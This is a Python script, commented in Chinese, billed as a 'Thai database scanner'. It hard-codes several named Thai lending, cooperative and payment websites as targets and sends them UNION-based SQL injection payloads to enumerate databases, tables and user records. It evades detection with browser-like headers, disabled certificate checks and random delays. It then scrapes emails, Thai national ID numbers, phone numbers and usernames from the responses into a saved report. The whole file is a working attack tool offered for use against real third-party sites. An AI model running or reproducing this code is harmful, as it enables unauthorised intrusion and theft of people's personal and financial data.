#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
泰国数据库扫描器
直接查询目标数据库结构和内容
"""

import requests
import json
import time
import random
import sqlite3
import re
from datetime import datetime
import threading
from concurrent.futures import ThreadPoolExecutor

class ThaiDatabaseScanner:
    """泰国数据库扫描器"""

    def __init__(self):
        self.targets = {
            "peacoop_or_th": {
                "name": "PEACOOP",
                "base_url": "https://peacoop.or.th",
                "api_endpoints": [
                    "/api/members",
                    "/api/users",
                    "/api/customers",
                    "/members",
                    "/users",
                    "/customers"
                ]
            },
            "ngoenmun_com": {
                "name": "NgernMun",
                "base_url": "https://ngoenmun.com",
                "api_endpoints": [
                    "/api/v1/users",
                    "/api/v1/members",
                    "/api/v1/customers",
                    "/api/v1/applications",
                    "/api/v1/loans",
                    "/api/users",
                    "/api/members"
                ]
            },
            "moneycat_co_th": {
                "name": "MoneyCat",
                "base_url": "https://www.moneycat.co.th",
                "api_endpoints": [
                    "/api/users",
                    "/api/customers",
                    "/api/applications",
                    "/api/loans"
                ]
            },
            "gcash_co_th": {
                "name": "GCash",
                "base_url": "https://www.gcash.co.th",
                "api_endpoints": [
                    "/api/users",
                    "/api/customers",
                    "/api/accounts",
                    "/api/transactions"
                ]
            }
        }

        # 数据库查询载荷
        self.db_queries = {
            "mysql": {
                "databases": "SELECT schema_name FROM information_schema.schemata",
                "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()",
                "columns": "SELECT column_name, data_type FROM information_schema.columns WHERE table_name='%s'",
                "count": "SELECT COUNT(*) FROM %s",
                "sample": "SELECT * FROM %s LIMIT 5"
            },
            "postgresql": {
                "databases": "SELECT datname FROM pg_database",
                "tables": "SELECT tablename FROM pg_tables WHERE schemaname='public'",
                "columns": "SELECT column_name, data_type FROM information_schema.columns WHERE table_name='%s'",
                "count": "SELECT COUNT(*) FROM %s",
                "sample": "SELECT * FROM %s LIMIT 5"
            }
        }

        # 常见表名
        self.common_tables = [
            "users", "members", "customers", "clients",
            "accounts", "user_accounts", "bank_accounts",
            "loans", "applications", "loan_applications",
            "transactions", "payments", "deposits",
            "profiles", "user_profiles", "customer_profiles",
            "contacts", "phone_numbers", "emails",
            "documents", "files", "attachments"
        ]

        self.results = []

    def test_database_query(self, target_info, endpoint):
        """测试数据库查询"""
        base_url = target_info["base_url"]
        full_url = base_url + endpoint

        # SQL注入载荷来查询数据库信息
        queries = [
            # 查询数据库数量
            {"param": "id", "payload": "1 UNION SELECT COUNT(*),2,3,4,5 FROM information_schema.schemata"},
            {"param": "id", "payload": "1' UNION SELECT COUNT(*),2,3,4,5 FROM information_schema.schemata--"},

            # 查询表数量
            {"param": "id", "payload": "1 UNION SELECT COUNT(*),2,3,4,5 FROM information_schema.tables WHERE table_schema=DATABASE()"},
            {"param": "id", "payload": "1' UNION SELECT COUNT(*),2,3,4,5 FROM information_schema.tables WHERE table_schema=DATABASE()--"},

            # 查询具体表
            {"param": "id", "payload": "1 UNION SELECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 5"},
            {"param": "id", "payload": "1' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 5--"},

            # 查询用户表结构
            {"param": "id", "payload": "1 UNION SELECT column_name,2,3,4,5 FROM information_schema.columns WHERE table_name='users' LIMIT 10"},
            {"param": "id", "payload": "1' UNION SELECT column_name,2,3,4,5 FROM information_schema.columns WHERE table_name='users' LIMIT 10--"},

            # 查询用户数据
            {"param": "id", "payload": "1 UNION SELECT username,2,3,4,5 FROM users LIMIT 5"},
            {"param": "id", "payload": "1' UNION SELECT username,2,3,4,5 FROM users LIMIT 5--"},

            # 查询表名列表
            {"param": "id", "payload": "1 UNION SELECT GROUP_CONCAT(table_name),2,3,4,5 FROM information_schema.tables WHERE table_schema=DATABASE()"},
            {"param": "id", "payload": "1' UNION SELECT CONCAT(table_name),2,3,4,5 FROM information_schema.tables WHERE table_schema=DATABASE()--"},
        ]

        results = {
            "target": target_info["name"],
            "endpoint": endpoint,
            "url": full_url,
            "database_info": {},
            "tables_found": [],
            "user_data": [],
            "success": False
        }

        try:
            session = requests.Session()
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive'
            })

            for query in queries:
                try:
                    response = session.get(full_url, params=query, timeout=10, verify=False)

                    if response.status_code == 200:
                        content = response.text

                        # 解析数据库信息
                        if "information_schema" in content.lower():
                            if "schemata" in content.lower():
                                # 提取数据库数量
                                db_count_match = re.search(r'(\d+)', content)
                                if db_count_match:
                                    results["database_info"]["databases_count"] = db_count_match.group(1)

                            if "tables" in content.lower():
                                # 提取表信息
                                table_matches = re.findall(r'[a-zA-Z_][a-zA-Z0-9_]*', content)
                                for match in table_matches:
                                    if any(table in match.lower() for table in self.common_tables):
                                        if match not in results["tables_found"]:
                                            results["tables_found"].append(match)

                        # 检查用户数据
                        user_patterns = [
                            r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',  # 邮箱
                            r'\b\d{13}\b',  # 泰国身份证
                            r'\b0[689]\d{8}\b',  # 手机号
                            r'[a-zA-Z][a-zA-Z0-9_]{3,20}'  # 用户名
                        ]

                        for pattern in user_patterns:
                            matches = re.findall(pattern, content)
                            if matches:
                                results["user_data"].extend(matches[:5])  # 限制数量
                                results["success"] = True

                        time.sleep(random.uniform(0.5, 1.5))

                except Exception as e:
                    continue

        except Exception as e:
            print(f"查询失败 {target_info['name']} - {endpoint}: {str(e)}")

        return results

    def scan_target_databases(self, target_key, target_info):
        """扫描目标数据库"""
        print(f"\n🔍 扫描数据库: {target_info['name']}")

        target_results = {
            "target": target_info["name"],
            "database_count": 0,
            "tables_per_db": {},
            "user_table_info": {},
            "sample_data": {},
            "total_records": {},
            "success": False
        }

        # 查询所有可能的端点
        for endpoint in target_info["api_endpoints"]:
            print(f"  测试端点: {endpoint}")
            result = self.test_database_query(target_info, endpoint)

            if result["success"]:
                target_results["success"] = True

                # 统计数据库信息
                if result["database_info"]:
                    target_results["database_count"] = int(result["database_info"].get("databases_count", 0))

                # 收集表信息
                if result["tables_found"]:
                    target_results["tables_per_db"][endpoint] = len(result["tables_found"])

                # 收集用户数据
                if result["user_data"]:
                    target_results["sample_data"][endpoint] = result["user_data"]

        return target_results

    def generate_database_report(self, results):
        """生成数据库报告"""
        report = {
            "scan_time": datetime.now().isoformat(),
            "targets_scanned": len(results),
            "successful_scans": len([r for r in results if r["success"]]),
            "database_summary": {},
            "detailed_results": results
        }

        # 汇总统计
        total_databases = sum(r.get("database_count", 0) for r in results)
        total_tables = sum(sum(r.get("tables_per_db", {}).values()) for r in results)

        report["database_summary"] = {
            "total_databases_found": total_databases,
            "total_tables_found": total_tables,
            "targets_with_data": len([r for r in results if r["success"]])
        }

        # 保存报告
        report_file = f"thai_database_scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)

        return report, report_file

    def print_results(self, results, report_file):
        """打印结果"""
        print("\n" + "="*80)
        print("📊 泰国数据库扫描结果")
        print("="*80)
        print(f"扫描时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"报告文件: {report_file}")
        print("="*80)

        successful = [r for r in results if r["success"]]

        print(f"\n📈 扫描统计:")
        print(f"  总目标数: {len(results)}")
        print(f"  成功扫描: {len(successful)}")
        print(f"  成功率: {(len(successful)/len(results)*100):.1f}%" if results else "0%")

        print(f"\n🗄️ 数据库信息:")
        for result in successful:
            print(f"\n  🎯 {result['target']}:")
            print(f"    数据库数量: {result.get('database_count', '未知')}")
            print(f"    发现表数: {sum(result.get('tables_per_db', {}).values())}")
            print(f"    有数据端点: {len(result.get('tables_per_db', {}))}")

            if result.get("tables_per_db"):
                print(f"    表分布:")
                for endpoint, count in result["tables_per_db"].items():
                    print(f"      {endpoint}: {count} 个表")

            if result.get("sample_data"):
                print(f"    样本数据:")
                for endpoint, data in result["sample_data"].items():
                    print(f"      {endpoint}: {len(data)} 项数据")

        print(f"\n💾 报告已保存到: {report_file}")

    def run_scan(self):
        """运行扫描"""
        print("🚀 启动泰国数据库扫描器")
        print("="*80)

        all_results = []

        # 多线程扫描
        with ThreadPoolExecutor(max_workers=3) as executor:
            future_to_target = {
                executor.submit(self.scan_target_databases, key, value): key
                for key, value in self.targets.items()
            }

            for future in future_to_target:
                target_key = future_to_target[future]
                try:
                    result = future.result()
                    all_results.append(result)
                except Exception as e:
                    print(f"扫描失败 {target_key}: {str(e)}")

        # 生成报告
        report, report_file = self.generate_database_report(all_results)

        # 打印结果
        self.print_results(all_results, report_file)

        return all_results, report

def main():
    scanner = ThaiDatabaseScanner()
    scanner.run_scan()

if __name__ == "__main__":
    main()